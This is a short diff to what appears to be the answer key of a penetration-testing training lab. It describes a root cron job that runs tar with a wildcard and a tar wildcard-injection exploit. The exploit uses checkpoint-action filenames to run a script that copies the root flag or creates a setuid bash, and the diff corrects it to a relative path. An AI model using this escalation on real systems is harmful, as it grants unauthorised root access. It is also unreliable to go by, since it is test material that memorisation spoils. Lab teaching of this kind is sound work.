@@ -6,8 +6,10 @@ Ground truth for the coach:
 - vuln: /etc/cron.d/pentrain-wildcard runs every minute as root:
   `cd /home/ops/backup && tar czf /var/backups/ops-home.tar.gz *`
 - exploit: drop files into /home/ops/backup named
-  `--checkpoint=1` and `--checkpoint-action=exec=sh /home/ops/pwn.sh`
-  where pwn.sh does e.g. `cp /root/root.txt /tmp/ && chmod 644 /tmp/root.txt`
+  `--checkpoint=1` and `--checkpoint-action=exec=sh pwn.sh`
+  (RELATIVE path — filenames can't contain `/`, `exec=sh /abs/pwn.sh`
+  can never be created). pwn.sh sits in the same dir and does e.g.
+  `cp /root/root.txt /tmp/rt.txt && chmod 644 /tmp/rt.txt`
   or `cp /bin/bash /tmp/rbash && chmod +s /tmp/rbash`
 - flags: /home/ops/user.txt, /root/root.txt
 
